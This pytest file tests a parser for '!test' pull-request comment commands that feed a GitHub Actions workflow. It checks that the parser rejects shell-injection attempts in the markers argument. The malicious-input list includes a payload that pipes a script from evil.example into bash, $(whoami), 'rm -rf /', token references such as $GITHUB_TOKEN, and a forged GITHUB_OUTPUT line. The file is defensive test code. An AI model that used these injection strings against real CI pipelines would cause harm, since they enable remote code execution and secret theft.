import pytest
from parse_test_comment_command import format_outputs, main, parse_command

# Shell metacharacters that must never reach the workflow `run:` blocks that
# interpolate the `markers` output into a `model-config-tests -m "..."` command.
INJECTION_MARKERS_MALICIOUS = [
    'x"; curl https://evil.example/s.sh | bash; "',
    "$(whoami)",
    "`id`",
    "slow; rm -rf /",
    "slow && curl evil.example",
    "slow | tee /tmp/x",
    "slow > /tmp/x",
    "$GITHUB_TOKEN",
    "${{ secrets.GITHUB_TOKEN }}",
    "slow#comment",
    "markers=pwned\ntest-type=repro",
]
INJECTION_MARKERS_UNPARSABLE = [
    "slow'quote",
    "slow\\",
]


def assert_rejected(command_body: str, exception_type: type[BaseException]) -> None:
    """Assert a command body is rejected.

    Bad input is refused either by argparse (SystemExit) or, for input that
    isn't even well-formed enough to split, by shlex (ValueError). Both abort
    the action before anything is written to GITHUB_OUTPUT, so accept either.
    """
    with pytest.raises(exception_type) as exc:
        parse_command(command_body)

    if exception_type is SystemExit:
        assert exc.value.code == 2


class TestParseCommand:
    def test_minimal_command(self):
        args = parse_command("!test repro")

        assert args.test_type == "repro"
        assert args.commit is False
        assert args.markers == ""

    @pytest.mark.parametrize("flag", ["-c", "--commit"])
    def test_commit_flag(self, flag):
        assert parse_command(f"!test repro {flag}").commit is True

    @pytest.mark.parametrize("flag", ["-m", "--markers"])
    def test_markers_flag(self, flag):
        args = parse_command(f'!test repro {flag} "slow and not flaky"')

        assert args.markers == "slow and not flaky"

    @pytest.mark.parametrize(
        "markers",
        [
            "slow",
            "not slow",
            "slow and not flaky",
            "(slow or fast) and not flaky",
            "some_marker_1",
        ],
    )
    def test_valid_marker_strings(self, markers):
        assert parse_command(f'!test repro -m "{markers}"').markers == markers

    def test_combined_flags(self):
        args = parse_command('!test repro -c -m "slow"')

        assert (args.test_type, args.commit, args.markers) == ("repro", True, "slow")

    def test_only_first_line_is_parsed(self):
        """Trailing lines are prose, and must not be able to inject arguments."""
        args = parse_command("!test repro\n-c\nsome extra commentary")

        assert args.commit is False

    @pytest.mark.parametrize("newline", ["\n", "\r\n", "\r"])
    def test_line_endings(self, newline):
        args = parse_command(f"!test repro -c{newline}trailing prose")

        assert args.commit is True

    def test_surrounding_whitespace(self):
        args = parse_command("!test   repro   -c  ")

        assert (args.test_type, args.commit) == ("repro", True)


class TestInvalidCommands:
    @pytest.mark.parametrize(
        "body",
        [
            "!test bogus",
            "!test",
            "!test repro extra-positional",
            "!test repro --unknown-flag",
            "!test repro -m",
        ],
    )
    def test_rejects_invalid_args(self, body):
        assert_rejected(body, SystemExit)

    @pytest.mark.parametrize("markers", INJECTION_MARKERS_MALICIOUS)
    def test_rejects_malicious_shell_metacharacters(self, markers):
        """The allowlist is a security control - it must reject anything
        that could break out of the quoting in the workflow `run:` block."""
        assert_rejected(f"!test repro --markers={markers}", SystemExit)

    @pytest.mark.parametrize("markers", INJECTION_MARKERS_UNPARSABLE)
    def test_rejects_unparsable_marker_strings(self, markers):
        """The allowlist is a security control - it must reject anything
        that could break out of the quoting in the workflow `run:` block."""
        assert_rejected(f"!test repro --markers={markers}", ValueError)

    @pytest.mark.parametrize("body", ['!test repro -m "slow', "!test repro -m slow\\"])
    def test_rejects_malformed_quoting(self, body):
        assert_rejected(body, ValueError)


class TestFormatOutputs:
    def test_output_lines(self):
        outputs = format_outputs(parse_command('!test repro -c -m "slow"'))

        assert outputs == "test-type=repro\nrequires-commit=true\nmarkers=slow\n"

    def test_commit_is_rendered_as_yaml_bool(self):
        """GitHub Actions expressions compare against the strings
        'true'/'false', not python's 'True'/'False'."""
        assert "requires-commit=false\n" in format_outputs(parse_command("!test repro"))

    def test_empty_markers_is_falsy_for_github_expressions(self):
        """The workflow relies on `markers || <ci.json fallback>`, so an
        unset marker string must render as genuinely empty."""
        assert "markers=\n" in format_outputs(parse_command("!test repro"))

    def test_outputs_are_single_lines(self):
        """Each output must occupy exactly one line, otherwise a crafted
        value could forge additional GITHUB_OUTPUT entries."""
        outputs = format_outputs(parse_command('!test repro -m "slow and not flaky"'))

        assert len(outputs.strip().splitlines()) == 3


class TestMain:
    def test_writes_github_output_file(self, tmp_path, monkeypatch):
        output_file = tmp_path / "github_output"
        monkeypatch.setenv("COMMAND_BODY", '!test repro -c -m "slow"')
        monkeypatch.setenv("GITHUB_OUTPUT", str(output_file))

        main()

        assert output_file.read_text() == (
            "test-type=repro\nrequires-commit=true\nmarkers=slow\n"
        )

    def test_appends_to_existing_github_output(self, tmp_path, monkeypatch):
        output_file = tmp_path / "github_output"
        output_file.write_text("existing=value\n")
        monkeypatch.setenv("COMMAND_BODY", "!test repro")
        monkeypatch.setenv("GITHUB_OUTPUT", str(output_file))

        main()

        assert output_file.read_text().startswith("existing=value\n")

    def test_does_not_write_outputs_on_invalid_command(self, tmp_path, monkeypatch):
        output_file = tmp_path / "github_output"
        monkeypatch.setenv("COMMAND_BODY", "!test repro -m $(whoami)")
        monkeypatch.setenv("GITHUB_OUTPUT", str(output_file))

        with pytest.raises(SystemExit):
            main()

        assert not output_file.exists()
